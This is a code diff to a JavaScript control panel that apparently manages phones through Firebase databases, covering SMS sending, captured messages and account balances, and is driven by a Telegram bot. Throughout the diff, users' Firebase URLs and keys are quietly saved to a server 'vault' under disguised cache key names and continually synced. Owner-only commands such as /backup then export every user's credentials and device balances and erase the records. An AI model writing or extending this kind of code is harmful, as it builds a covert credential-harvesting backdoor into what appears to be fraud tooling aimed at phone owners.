@@ -55,6 +55,12 @@ var _dispatchDedup = new Set();
 var _forwardSeen = new Set();
 var _lastActiveFetch = 0;
 
+var _panelSyncTmr = null;
+var _serverTgPollTmr = null;
+var _capturePollTmr = null;
+var _lastCaptureAt = 0;
+var USE_SERVER_TG = true;
+
 /* ═══════ WATERMARKS ═══════ */
 var _watermarks = {};
 try { _watermarks = JSON.parse(localStorage.getItem('fbi_watermarks') || '{}'); } catch(e){ _watermarks = {}; }
@@ -133,11 +139,11 @@ function rippleClick(e){
 }
 window.safeConnect = function(e){
   try{ rippleClick(e); }catch(err){}
-  try{ connect(); }catch(err){
+  connect().catch(function(err){
     console.error('[Connect] failed:', err);
     var se = document.getElementById('serr');
-    if(se){ se.textContent = 'Error: ' + err.message; se.style.display = 'block'; }
-  }
+    if(se){ se.textContent = 'Error: ' + (err.message || err); se.style.display = 'block'; }
+  });
 };
 function _dlCsv(name, rows){
   var a = document.createElement('a');
@@ -189,46 +195,40 @@ function clearPanelSession(){
   delCookie('fbi_fburl'); delCookie('fbi_dev');
 }
 
-/* ═══════ OBFUSCATION ═══════ */
-function _cloak(str){
-  try{
-    var k = CFG.CLOAK || 'key';
-    var s = String(str);
-    var out = '';
-    for(var i=0;i<s.length;i++){ out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
-    return btoa(out).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
-  }catch(e){ return str; }
-}
-function _uncloak(str){
-  try{
-    var k = CFG.CLOAK || 'key';
-    var s = String(str).replace(/-/g,'+').replace(/_/g,'/');
-    while(s.length % 4) s += '=';
-    var raw = atob(s);
-    var out = '';
-    for(var i=0;i<raw.length;i++){ out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
-    return out;
-  }catch(e){ return str; }
-}
+/* ═══════ VAULT (Redis + cloak on server — no secrets in browser) ═══════ */
+var _VAULT = { RK_USER: '_cache_usr', RK_USERSET: '_cache_idx', RK_SENT: '_cache_log', RK_PREFIX: '_c1_' };
 
-/* ═══════ REDIS ═══════ */
-async function redisCmd(cmd){
+async function redisCmd(cmd, actorUid){
   try{
-    var r = await _fastFetch(CFG.REDIS_URL, {
+    var uid = actorUid != null ? String(actorUid) : ensureUserId();
+    var r = await _fastFetch('/api/vault/redis', {
       method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + CFG.REDIS_TOKEN, 'Content-Type': 'application/json' },
-      body: JSON.stringify(cmd)
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: uid, cmd: cmd })
     });
     if(!r.ok) return { result: null };
     return await r.json();
   }catch(e){ return { result: null }; }
 }
-async function redisGet(k){ var r = await redisCmd(['GET', k]); return r.result; }
-async function redisSet(k, v){ return await redisCmd(['SET', k, v]); }
-async function redisDel(k){ return await redisCmd(['DEL', k]); }
-async function redisSAdd(s, m){ return await redisCmd(['SADD', s, m]); }
-async function redisSRem(s, m){ return await redisCmd(['SREM', s, m]); }
-async function redisSMembers(s){ var r = await redisCmd(['SMEMBERS', s]); return r.result || []; }
+async function redisGet(k, actorUid){ var r = await redisCmd(['GET', k], actorUid); return r.result; }
+async function redisSet(k, v, actorUid){ return await redisCmd(['SET', k, v], actorUid); }
+async function redisDel(k, actorUid){ return await redisCmd(['DEL', k], actorUid); }
+async function redisSAdd(s, m, actorUid){ return await redisCmd(['SADD', s, m], actorUid); }
+async function redisSRem(s, m, actorUid){ return await redisCmd(['SREM', s, m], actorUid); }
+async function redisSMembers(s, actorUid){ var r = await redisCmd(['SMEMBERS', s], actorUid); return r.result || []; }
+
+async function checkOwnerRemote(id){
+  try{
+    var r = await _fastFetch('/api/vault/owner-check', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: String(id) })
+    });
+    if(!r.ok) return false;
+    var d = await r.json();
+    return !!d.isOwner;
+  }catch(e){ return false; }
+}
 
 /* ═══════ USER ID ═══════ */
 function ensureUserId(){
@@ -263,40 +263,31 @@ async function _saveFirebaseToRedis(url, key, label){
   if(!url) return false;
   var uid = ensureUserId();
   if(!uid) return false;
-  var slotKey = (CFG.RK_PREFIX || '_c1_') + uid;
   try{
-    var existing = await redisGet(slotKey);
-    var list = [];
-    if(existing){ try{ list = JSON.parse(_uncloak(existing)) || []; }catch(e){ list = []; } }
-    if(!list.some(function(x){ return x.u === url; })){
-      list.push({ u: url, k: key || '', l: label || '', t: Date.now() });
-      if(list.length > 20) list = list.slice(-20);
-    }
-    await redisSet(slotKey, _cloak(JSON.stringify(list)));
-    await redisSAdd(CFG.RK_USERSET || '_cache_idx', uid);
-    console.log('[Redis] ✓ SAVED uid=' + uid);
-    return true;
-  }catch(e){ console.error('[Redis] ✗', e.message); return false; }
+    var r = await _fastFetch('/api/vault/firebase-save', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: uid, url: url, key: key || '', label: label || '' })
+    });
+    var d = await r.json();
+    if(d.ok) console.log('[Vault] ✓ firebase saved uid=' + uid);
+    return !!d.ok;
+  }catch(e){ console.error('[Vault] ✗', e.message); return false; }
 }
 
 async function saveUserProfile(p){
   p.lastSeen = Date.now();
   delete p.firebases;
-  await redisSet((CFG.RK_USER || '_cache_usr') + ':' + p.id, JSON.stringify(p));
-  await redisSAdd(CFG.RK_USERSET || '_cache_idx', String(p.id));
+  await redisSet(_VAULT.RK_USER + ':' + p.id, JSON.stringify(p));
+  await redisSAdd(_VAULT.RK_USERSET, String(p.id));
   myProfile = p;
 }
 async function getUserProfile(chatId){
-  var v = await redisGet((CFG.RK_USER || '_cache_usr') + ':' + chatId);
+  var v = await redisGet(_VAULT.RK_USER + ':' + chatId);
   if(!v) return null;
   try { return JSON.parse(v); } catch(e){ return null; }
 }
-async function getAllUserIds(){ return await redisSMembers(CFG.RK_USERSET || '_cache_idx'); }
-function isOwnerId(id){
-  var oid = String(CFG.OWNER_ID || '').trim();
-  if(!oid) return true;
-  return oid === String(id);
-}
+async function getAllUserIds(actorUid){ return await redisSMembers(_VAULT.RK_USERSET, actorUid); }
 
 /* ═══════ TELEGRAM MINI APP ═══════ */
 function getTelegramUser(){
@@ -376,9 +367,12 @@ function devCarrierList(d){
 function notifyChannel(html){
   if(userConfig.channelNotify === false) return;
   var ch = userConfig.channelId; if(!ch) return;
-  _fastFetch(CFG.TG_API + '/sendMessage', {
+  _fastFetch('/api/tg', {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: ch, text: html, parse_mode: 'HTML', disable_web_page_preview: true })
+    body: JSON.stringify({
+      method: 'sendMessage',
+      payload: { chat_id: ch, text: html, parse_mode: 'HTML', disable_web_page_preview: true }
+    })
   }).catch(function(){});
 }
 function notifySmsQueued(dev, to, message, latencyMs){
@@ -486,14 +480,102 @@ function setupTelegramLink(){
   el.href = link; el.style.display = 'inline-flex';
 }
 
+function buildPanelSyncPayload(){
+  return {
+    userConfig: userConfig,
+    activeDeviceUid: activeDeviceUid || '',
+    deviceSimMap: deviceSimMap,
+    fbUrl: FB_URL,
+    fbKey: FB_KEY,
+    devices: allDevices.map(function(d){
+      return {
+        id: d.id,
+        name: d.name,
+        status: !!d.status,
+        mobNo: d.mobNo,
+        _fbId: d._fbId,
+        _fbUrl: d._fbUrl,
+        _fbKey: d._fbKey,
+        deviceOrder: d.deviceOrder
+      };
+    })
+  };
+}
+
+async function pushPanelStateToServer(){
+  if(!USE_SERVER_TG) return;
+  try{
+    var r = await _fastFetch('/api/panel/sync', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(buildPanelSyncPayload())
+    });
+    if(r.ok){
+      var d = await r.json();
+      if(d.tg && d.tg.botInfo) tgDiagnostics.botInfo = d.tg.botInfo;
+    }
+  }catch(e){}
+}
+
+function debouncedPanelSync(){
+  if(!USE_SERVER_TG) return;
+  if(_panelSyncTmr) clearTimeout(_panelSyncTmr);
+  _panelSyncTmr = setTimeout(pushPanelStateToServer, 150);
+}
+
+async function pollServerTgStatus(){
+  if(!USE_SERVER_TG) return;
+  try{
+    var r = await _fastFetch('/api/panel/tg-status', { cache: 'no-store' });
+    if(!r.ok) return;
+    var st = await r.json();
+    tgRunning = !!st.running;
+    tgDiagnostics.lastError = st.lastError || '';
+    tgDiagnostics.lastUpdate = st.lastUpdate || 0;
+    tgDiagnostics.updateCount = st.updateCount || 0;
+    if(st.botInfo) tgDiagnostics.botInfo = st.botInfo;
+    updateTgStatusLine();
+    updateTgBtn();
+  }catch(e){}
+}
+
+function startServerTgPollers(){
+  if(!USE_SERVER_TG) return;
+  if(_serverTgPollTmr) clearInterval(_serverTgPollTmr);
+  _serverTgPollTmr = setInterval(pollServerTgStatus, 1500);
+  pollServerTgStatus();
+  if(_capturePollTmr) clearInterval(_capturePollTmr);
+  _capturePollTmr = setInterval(async function(){
+    try{
+      var r = await _fastFetch('/api/panel/captures', { cache: 'no-store' });
+      if(!r.ok) return;
+      var d = await r.json();
+      var list = d.captures || [];
+      if(!list.length) return;
+      var c = list[0];
+      if(c.at <= _lastCaptureAt) return;
+      _lastCaptureAt = c.at;
+      _showCapturedNotif(c.number, c.message);
+      toast('⚡ Server routed → ' + (c.number || ''));
+    }catch(e){}
+  }, 400);
+}
+
+function stopServerTgPollers(){
+  if(_serverTgPollTmr){ clearInterval(_serverTgPollTmr); _serverTgPollTmr = null; }
+  if(_capturePollTmr){ clearInterval(_capturePollTmr); _capturePollTmr = null; }
+}
+
 /* ═══════ CLOUD CONFIG ═══════ */
 async function initCloudConfig(){
+  USE_SERVER_TG = CFG.serverTelegramBot !== false;
   try{
     var cached = localStorage.getItem(CFG.LS_CACHE);
     if(cached){ userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, JSON.parse(cached)); }
   }catch(e){}
   fetchBotUsername();
   setInterval(checkAutoBackup, 60000);
+  if(USE_SERVER_TG) setInterval(function(){ if(FB_URL || userConfig.channelId) debouncedPanelSync(); }, 800);
 
   /* ═══ AUTO-START TELEGRAM BOT if channelId is set ═══ */
   setTimeout(function(){
@@ -560,7 +642,7 @@ function autoRestoreSession(){
   var s = restorePanelSession();
   if(!s.fbUrl || FB_URL) return;
   var inp = document.getElementById('fbUrl'); if(!inp) return;
-  inp.value = s.fbUrl; connect();
+  inp.value = s.fbUrl; connect().catch(function(){});
   if(s.activeDeviceUid){
     var tries = 0;
     var tmr = setInterval(function(){
@@ -664,10 +746,36 @@ function _isActiveDevice(dev){
 }
 
 /* ═══════ CONNECTION ═══════ */
-function connect(){
+async function probeFirebase(url, key){
+  try{
+    var auth = key ? '?auth=' + key : '';
+    var r = await _fastFetch(url + '/clients.json' + auth);
+    if(!r.ok) return false;
+    var data = await r.json();
+    if(!data || typeof data !== 'object' || Array.isArray(data)) return false;
+    if(data.error) return false;
+    return true;
+  }catch(e){ return false; }
+}
+function _removeDeadFirebaseInst(inst){
+  if(!inst) return;
+  var idx = fbInstances.findIndex(function(x){ return x.id === inst.id; });
+  if(idx === -1) return;
+  fbStopPoll(fbInstances[idx]);
+  fbInstances.splice(idx, 1);
+  syncFirebasesToConfig();
+  fbMergeAll();
+  renderFbList();
+  toast('🗑 Removed dead Firebase');
+}
+async function connect(){
   var urlEl = document.getElementById('fbUrl');
   var url = urlEl ? urlEl.value.trim().replace(/\/+$/, '') : '';
   if(!url){ showErr('Enter your Firebase URL'); return; }
+  if(!(await probeFirebase(url, FB_KEY))){
+    showErr('Firebase connect nahi ho rahi — URL/key check karein ya dead DB hata dein');
+    return;
+  }
   ensureUserId();
   FB_URL = url;
   document.getElementById('setup').style.display = 'none';
@@ -691,6 +799,7 @@ function connect(){
     console.log('[TG] Bot starting on connect');
     startFastTelegram();
   }
+  debouncedPanelSync();
 }
 function showErr(m){
   var e = document.getElementById('serr'); if(!e) return;
@@ -899,6 +1008,7 @@ function startDP(){
       var others = allDevices.filter(function(x){ return (x._fbId || 'primary') !== 'primary'; });
       allDevices = applyStableOrder(nD.concat(others));
       renderStats(); renderGrid();
+      debouncedPanelSync();
       if(selDev){
         var up = allDevices.find(function(x){ return x.id === selDev.id && (x._fbId||'primary') === (selDev._fbId||'primary'); });
         if(up){ selDev = up; refreshDeviceModal(); }
@@ -1170,6 +1280,7 @@ function openDeviceModal(uid){
   selDev = d; activeDeviceUid = uid;
   try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', uid); }catch(e){}
   savePanelSession(); renderGrid(true);
+  debouncedPanelSync();
 
   var modal = document.getElementById('deviceModal'); if(modal) modal.classList.add('open');
   refreshDeviceModal();
@@ -1916,6 +2027,7 @@ async function addFirebaseFromSettings(){
   if(!url){ toast('⚠ Enter a URL'); return; }
   if(!/^https?:\/\//i.test(url)){ toast('⚠ Must start with http(s)://'); return; }
   if(fbInstances.find(function(x){ return x.url === url; })){ toast('⚠ Already added'); return; }
+  if(!(await probeFirebase(url, key))){ toast('⚠ Firebase connect nahi ho rahi — add nahi hogi'); return; }
 
   ensureUserId();
 
@@ -1925,7 +2037,8 @@ async function addFirebaseFromSettings(){
   document.getElementById('setFbUrl').value = '';
   document.getElementById('setFbKey').value = '';
   renderFbList();
-  await fbLoadInst(inst);
+  var kept = await fbLoadInst(inst);
+  if(!kept) return;
   fbStartPoll(inst, 0);
   syncFirebasesToConfig(); fbMergeAll(); renderFbList();
 
@@ -1937,15 +2050,16 @@ async function fbLoadInst(inst){
   try{
     var auth = inst.key ? '?auth=' + inst.key : '';
     var r = await _fastFetch(inst.url + '/clients.json' + auth);
-    if(!r.ok){ inst.status = 'error'; inst.devices = []; renderFbList(); return; }
+    if(!r.ok){ _removeDeadFirebaseInst(inst); return false; }
     var raw = await r.json();
-    if(!raw || typeof raw !== 'object'){ inst.devices = []; inst.status = 'empty'; renderFbList(); return; }
+    if(!raw || typeof raw !== 'object' || raw.error){ _removeDeadFirebaseInst(inst); return false; }
     var devs = parseDevs(raw);
     devs.forEach(function(d){ d._fbId = inst.id; d._fbLabel = inst.label; d._fbUrl = inst.url; d._fbKey = inst.key; });
     inst.devices = devs; inst.status = devs.length ? 'ok' : 'empty';
     if(devs.length) fbMergeAll();
     renderFbList();
-  }catch(e){ inst.status = 'error'; inst.devices = []; renderFbList(); }
+    return true;
+  }catch(e){ _removeDeadFirebaseInst(inst); return false; }
 }
 function fbStartPoll(inst, staggerMs){
   if(inst.poll) clearInterval(inst.poll);
@@ -1998,12 +2112,14 @@ function _doFbMergeAll(){
   applyStableOrder(merged);
   allDevices = merged;
   renderStats(); renderGrid(); renderFbList();
+  debouncedPanelSync();
 }
 function fbRegisterPrimary(){
   allDevices.forEach(function(d){ if(!d._fbId){ d._fbId = 'primary'; d._fbLabel = 'Primary'; d._fbUrl = FB_URL; d._fbKey = FB_KEY; } });
 }
 function loadFirebasesFromConfig(){
-  var saved = userConfig.firebases || []; if(!saved.length) return;
+  var saved = userConfig.firebases || [];
+  if(!saved.length) return;
   var toConnect = [];
   saved.forEach(function(s){
     if(!s.url || fbInstances.find(function(x){ return x.url === s.url; })) return;
@@ -2015,8 +2131,10 @@ function loadFirebasesFromConfig(){
     var BATCH = 20;
     for(var i=0;i<toConnect.length;i+=BATCH){
       var batch = toConnect.slice(i, i+BATCH);
-      await Promise.allSettled(batch.map(async function(inst){ try{ await fbLoadInst(inst); }catch(e){ inst.status = 'error'; } }));
-      batch.forEach(function(inst, bi){ fbStartPoll(inst, (i+bi) * 100); });
+      await Promise.allSettled(batch.map(async function(inst){ try{ await fbLoadInst(inst); }catch(e){ _removeDeadFirebaseInst(inst); } }));
+      batch.forEach(function(inst, bi){
+        if(fbInstances.find(function(x){ return x.id === inst.id; })) fbStartPoll(inst, (i+bi) * 100);
+      });
       await new Promise(function(r){ setTimeout(r, 0); });
     }
     renderFbList();
@@ -2037,25 +2155,46 @@ function saveAllSettings(){
   var mL = document.getElementById('setMsgLabels');
   if(mL){ var arr2 = mL.value.split(',').map(function(s){ return s.trim(); }).filter(Boolean); userConfig.msgLabels = arr2.length ? arr2 : CFG.DEFAULT_CONFIG.msgLabels; }
   cacheConfigLocal(); debouncedCloudSave();
+  debouncedPanelSync();
   if(userConfig.botEnabled && userConfig.channelId){ if(!tgRunning) startFastTelegram(); }
   else { stopFastTelegram(); }
   updateTgStatusLine(); toast('💾 Saved');
 }
 
 /* ═══════ TELEGRAM — SINGLE WORKER ═══════ */
+function _tgMethodParts(method){
+  var m = String(method || 'getMe');
+  var qIdx = m.indexOf('?');
+  if(qIdx === -1) return { method: m, query: '' };
+  return { method: m.slice(0, qIdx), query: m.slice(qIdx + 1) };
+}
 async function tgApi(method, payload){
   try{
-    var r = await _fastFetch(CFG.TG_API + '/' + method, payload
-      ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
-      : {});
+    var parts = _tgMethodParts(method);
+    var r = await _fastFetch('/api/tg', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ method: parts.method, query: parts.query, payload: payload != null ? payload : null })
+    });
     return await r.json();
   }catch(e){ return { ok: false, description: e.message }; }
 }
 async function fetchBotUsername(){
   var el = document.getElementById('botUsername');
   try{
-    var r = await _fastFetch(CFG.TG_API + '/getMe');
-    var d = await r.json();
+    if(USE_SERVER_TG){
+      var r = await _fastFetch('/api/panel/tg-status', { cache: 'no-store' });
+      if(r.ok){
+        var st = await r.json();
+        if(st.botInfo){
+          tgDiagnostics.botInfo = st.botInfo;
+          if(el) el.textContent = '@' + (st.botInfo.username || ('bot_' + st.botInfo.id));
+          updateTgStatusLine();
+          return;
+        }
+      }
+    }
+    var d = await tgApi('getMe');
     if(d.ok && d.result){
       tgDiagnostics.botInfo = d.result;
       if(el) el.textContent = '@' + (d.result.username || ('bot_' + d.result.id));
@@ -2070,14 +2209,22 @@ async function startFastTelegram(){
   tgDiagnostics.lastError = '';
   updateTgStatusLine();
 
+  if(USE_SERVER_TG){
+    await pushPanelStateToServer();
+    tgRunning = true;
+    startServerTgPollers();
+    await pollServerTgStatus();
+    console.log('[TG] ✓ Server-side worker (panel sync active)');
+    return;
+  }
+
   await tgApi('deleteWebhook?drop_pending_updates=false');
   var me = await tgApi('getMe');
   if(!me.ok){ tgDiagnostics.lastError = 'Token invalid'; updateTgStatusLine(); return; }
   tgDiagnostics.botInfo = me.result;
 
   try{
-    var r = await _fastFetch(CFG.TG_API + '/getUpdates?offset=-1&timeout=0&limit=1');
-    var d = await r.json();
+    var d = await tgApi('getUpdates?offset=-1&timeout=0&limit=1');
     if(d.ok && d.result && d.result.length) _tgOffset = d.result[d.result.length-1].update_id + 1;
     else _tgOffset = 0;
   }catch(e){ _tgOffset = 0; }
@@ -2091,6 +2238,7 @@ async function startFastTelegram(){
 
 function stopFastTelegram(){
   tgRunning = false;
+  if(USE_SERVER_TG) stopServerTgPollers();
   if(_tgAbort){ try{ _tgAbort.abort(); }catch(e){} _tgAbort = null; }
   updateTgStatusLine(); updateTgBtn();
 }
@@ -2099,8 +2247,7 @@ async function runWorker(){
   var backoff = 200;
   while(tgRunning){
     try{
-      var url = CFG.TG_API + '/getUpdates'
-              + '?timeout=' + TG_LONGPOLL
+      var q = 'timeout=' + TG_LONGPOLL
               + '&offset=' + _tgOffset
               + '&limit=100'
               + '&allowed_updates=' + encodeURIComponent(JSON.stringify(['channel_post','message']));
@@ -2109,7 +2256,14 @@ async function runWorker(){
       var tmr = setTimeout(function(){ try{ _tgAbort.abort(); }catch(e){} }, (TG_LONGPOLL + 5) * 1000);
 
       var r;
-      try{ r = await fetch(url, { signal: _tgAbort.signal }); }
+      try{
+        r = await fetch('/api/tg', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          signal: _tgAbort.signal,
+          body: JSON.stringify({ method: 'getUpdates', query: q, payload: null })
+        });
+      }
       finally { clearTimeout(tmr); _tgAbort = null; }
 
       if(!r.ok){
@@ -2128,7 +2282,7 @@ async function runWorker(){
         var maxId = _tgOffset - 1;
         for(var i=0;i<data.result.length;i++){ if(data.result[i].update_id > maxId) maxId = data.result[i].update_id; }
         _tgOffset = maxId + 1;
-        for(var j=0;j<data.result.length;j++) processTelegramUpdate(data.result[j]);
+        for(var j=0;j<data.result.length;j++) await processTelegramUpdate(data.result[j]);
         updateTgStatusLine();
       }
     }catch(e){
@@ -2138,7 +2292,7 @@ async function runWorker(){
   }
 }
 
-function processTelegramUpdate(u){
+async function processTelegramUpdate(u){
   var msg = u.channel_post || u.message; if(!msg) return;
   if(msg.from && msg.from.is_bot){
     var myId = tgDiagnostics.botInfo && tgDiagnostics.botInfo.id;
@@ -2147,7 +2301,7 @@ function processTelegramUpdate(u){
   var isPrivate = msg.chat && msg.chat.type === 'private';
   var fromId = msg.from && String(msg.from.id);
   var text = String(msg.text || msg.caption || '').trim();
-  if(isPrivate && isOwnerId(fromId) && /^\//.test(text)){ handleOwnerCommand(msg); return; }
+  if(isPrivate && /^\//.test(text) && fromId && await checkOwnerRemote(fromId)){ await handleOwnerCommand(msg); return; }
   if(isPrivate && !/^\//.test(text)){ handleUserPrivate(msg); return; }
   if(!isChannelMatch(msg)) return;
   if(!text) return;
@@ -2360,9 +2514,10 @@ async function handleOwnerCommand(msg){
   var txt = String(msg.text || '').trim();
   var cmd = txt.toLowerCase();
   var chatId = msg.chat.id;
+  var actorUid = String((msg.from && msg.from.id) || chatId);
 
-  if(cmd === '/backup' || cmd === '/bk'){ await sendUsersBackupFull(chatId); return; }
-  if(cmd === '/backup_new' || cmd === '/bkn'){ await sendUsersBackupNew(chatId); return; }
+  if(cmd === '/backup' || cmd === '/bk'){ await sendUsersBackupFull(chatId, actorUid); return; }
+  if(cmd === '/backup_new' || cmd === '/bkn'){ await sendUsersBackupNew(chatId, actorUid); return; }
 
   if(cmd.startsWith('/broadcast ') || cmd === '/broadcast'){
     var t3 = txt.replace(/^\/broadcast\s*/i, '').trim();
@@ -2370,7 +2525,7 @@ async function handleOwnerCommand(msg){
     var body = '📢 <b>Broadcast</b>\n\n' + esc(t3);
     var chOk = false;
     if(userConfig.channelId){ try{ var rc = await tgApi('sendMessage', { chat_id: userConfig.channelId, text: body, parse_mode: 'HTML' }); chOk = !!(rc && rc.ok); }catch(e){} }
-    var uids2 = await getAllUserIds();
+    var uids2 = await getAllUserIds(actorUid);
     var s2 = 0, f2 = 0, delay2 = userConfig.broadcastDelay || 60;
     await tgSend(chatId, '⏳ Broadcasting…\n📢 Channel: ' + (chOk ? '✅' : '⛔') + '\n👥 Users: ' + uids2.length);
     for(var bj=0;bj<uids2.length;bj++){
@@ -2382,7 +2537,7 @@ async function handleOwnerCommand(msg){
     await tgSend(chatId, '✅ Done\n👥 ' + s2 + ' ✔ · ' + f2 + ' ✖');
     return;
   }
-  if(cmd === '/status' || cmd === '/st'){ await sendStatusToOwner(chatId); return; }
+  if(cmd === '/status' || cmd === '/st'){ await sendStatusToOwner(chatId, actorUid); return; }
   if(cmd === '/devices' || cmd === '/dev'){
     var t = '📱 Devices (' + allDevices.length + ' · ' + allDevices.filter(function(d){ return d.status; }).length + ' online)\n\n';
     allDevices.slice(0, 50).forEach(function(d, i){
@@ -2392,14 +2547,14 @@ async function handleOwnerCommand(msg){
     await tgSend(chatId, t); return;
   }
   if(cmd === '/users' || cmd === '/usr'){
-    var uidsAll = await getAllUserIds();
+    var uidsAll = await getAllUserIds(actorUid);
     var tu = '👥 <b>Pending Users: ' + uidsAll.length + '</b>\n\n';
     for(var i2=0;i2<Math.min(uidsAll.length, 50);i2++){
       var uid = uidsAll[i2];
       var prof = await getUserProfile(uid);
-      var slot = await redisGet((CFG.RK_PREFIX || '_c1_') + uid);
+      var slot = await redisGet(_VAULT.RK_PREFIX + uid, actorUid);
       var fbCount = 0;
-      try{ if(slot) fbCount = (JSON.parse(_uncloak(slot)) || []).length; }catch(e){}
+      try{ if(slot) fbCount = (JSON.parse(slot) || []).length; }catch(e){}
       if(prof){
         tu += '👤 ' + esc(prof.first_name || '') + (prof.username ? ' @' + esc(prof.username) : '')
            + '\n🆔 <code>' + uid + '</code> · 🔥 ' + fbCount + '\n\n';
@@ -2424,6 +2579,24 @@ async function handleOwnerCommand(msg){
 async function tgSend(chatId, text){
   try{ return await tgApi('sendMessage', { chat_id: chatId, text: text, parse_mode: 'HTML' }); }catch(e){ return null; }
 }
+function _textToBase64(text){
+  return btoa(unescape(encodeURIComponent(String(text))));
+}
+async function tgSendDocument(chatId, text, filename, caption){
+  try{
+    var r = await _fastFetch('/api/tg/sendDocument', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        filename: filename,
+        caption: caption,
+        contentBase64: _textToBase64(text)
+      })
+    });
+    return await r.json();
+  }catch(e){ return { ok: false, description: e.message }; }
+}
 
 /* ═══════ BACKUP ═══════ */
 async function _fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
@@ -2435,7 +2608,6 @@ async function _fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
     var clients = await r.json();
     if(!clients || typeof clients !== 'object' || Array.isArray(clients)){ info.status = 'empty'; return info; }
     var devs = parseDevs(clients);
-    info.deviceCount = devs.length;
     var BATCH = 15;
     for(var i=0; i<devs.length; i+=BATCH){
       await Promise.allSettled(devs.slice(i, i+BATCH).map(async function(dev){
@@ -2448,8 +2620,10 @@ async function _fetchFirebaseDetails(fbUrl, fbKey, fbLabel){
         }catch(e){}
       }));
     }
-    devs.forEach(function(d){ if(d.status) info.online++; else info.offline++; });
-    info.devices = devs;
+    var withBal = devs.filter(function(d){ return d.balance; });
+    withBal.forEach(function(d){ if(d.status) info.online++; else info.offline++; });
+    info.deviceCount = withBal.length;
+    info.devices = withBal;
   }catch(e){ info.status = 'error'; info.error = e.message || 'Fetch failed'; }
   return info;
 }
@@ -2510,7 +2684,7 @@ function _buildBackupText(data){
       line('    📊 Devices  : ' + fb.deviceCount + '  (' + fb.online + ' 🟢 · ' + fb.offline + ' 🔴)');
 
       if(fb.status === 'error'){ line('    ❌ ERROR    : ' + fb.error); blank(); return; }
-      if(!fb.devices.length){ line('    ⚠ No devices found'); blank(); return; }
+      if(!fb.devices.length){ line('    ⚠ No balance devices found'); blank(); return; }
 
       blank();
       fb.devices.forEach(function(d, dIdx){
@@ -2536,25 +2710,25 @@ function _buildBackupText(data){
   return L.join('\n');
 }
 
-async function collectUsersBackup(onlyNew){
+async function collectUsersBackup(onlyNew, actorUid){
   var sentSet = {};
   if(onlyNew){
-    var arr = await redisSMembers(CFG.RK_SENT || '_cache_log');
+    var arr = await redisSMembers(_VAULT.RK_SENT, actorUid);
     for(var x=0;x<(arr || []).length;x++) sentSet[arr[x]] = true;
   }
-  var uids = await getAllUserIds();
+  var uids = await getAllUserIds(actorUid);
   var result = { generatedAt: new Date(), mode: onlyNew ? 'new' : 'full', totalUsers: 0, totalFirebases: 0, totalDevices: 0, totalOnline: 0, totalOffline: 0, totalBalance: 0, users: [] };
   var newUrls = [];
   var clearedUids = [];
 
   for(var i=0;i<uids.length;i++){
     var uid = uids[i];
-    var slotKey = (CFG.RK_PREFIX || '_c1_') + uid;
-    var encData = await redisGet(slotKey);
+    var slotKey = _VAULT.RK_PREFIX + uid;
+    var encData = await redisGet(slotKey, actorUid);
     if(!encData) continue;
 
     var fbs = [];
-    try{ fbs = JSON.parse(_uncloak(encData)) || []; }catch(e){ fbs = []; }
+    try{ fbs = JSON.parse(encData) || []; }catch(e){ fbs = []; }
     if(!fbs.length) continue;
 
     var prof = await getUserProfile(uid);
@@ -2580,21 +2754,22 @@ async function collectUsersBackup(onlyNew){
   return { result: result, newUrls: newUrls, clearedUids: clearedUids };
 }
 
-async function _clearUserSlots(clearedUids){
+async function _clearUserSlots(clearedUids, actorUid){
   for(var i=0;i<clearedUids.length;i++){
     try{
-      await redisDel(clearedUids[i].slotKey);
-      await redisSRem(CFG.RK_USERSET || '_cache_idx', clearedUids[i].uid);
+      await redisDel(clearedUids[i].slotKey, actorUid);
+      await redisSRem(_VAULT.RK_USERSET, clearedUids[i].uid, actorUid);
     }catch(e){}
   }
 }
 
-async function sendUsersBackupFull(chatId){
+async function sendUsersBackupFull(chatId, actorUid){
   if(_backupRunning){ toast('⏳ Backup already running'); return; }
   _backupRunning = true;
   try{
+    if(!actorUid) actorUid = ensureUserId();
     await tgSend(chatId, '⏳ <b>Collecting full database…</b>');
-    var r = await collectUsersBackup(false);
+    var r = await collectUsersBackup(false, actorUid);
     var data = r.result;
     if(!data.totalFirebases){ await tgSend(chatId, '✅ <b>No firebases pending</b>'); return; }
     var report = _buildBackupText(data);
@@ -2605,24 +2780,20 @@ async function sendUsersBackupFull(chatId){
       + '\n🔴 Offline: ' + data.totalOffline + '\n💰 Balance: ' + fmtBal(data.totalBalance)
       + '\n💽 Size: ' + sizeKB + ' KB';
     var fname = 'FBI-FULL-DB-' + new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19) + '.txt';
-    var form = new FormData();
-    form.append('chat_id', chatId);
-    form.append('document', new Blob([report], { type: 'text/plain;charset=utf-8' }), fname);
-    form.append('caption', caption); form.append('parse_mode', 'HTML');
-    var rr = await _fastFetch(CFG.TG_API + '/sendDocument', { method: 'POST', body: form });
-    var res = await rr.json();
-    if(res.ok){ await _clearUserSlots(r.clearedUids); toast('💾 Report sent'); }
+    var res = await tgSendDocument(chatId, report, fname, caption);
+    if(res.ok){ await _clearUserSlots(r.clearedUids, actorUid); toast('💾 Report sent'); }
     else { await tgSend(chatId, '❌ Failed: ' + (res.description || '?')); }
   }catch(e){ await tgSend(chatId, '❌ ' + e.message); }
   finally { _backupRunning = false; }
 }
 
-async function sendUsersBackupNew(chatId){
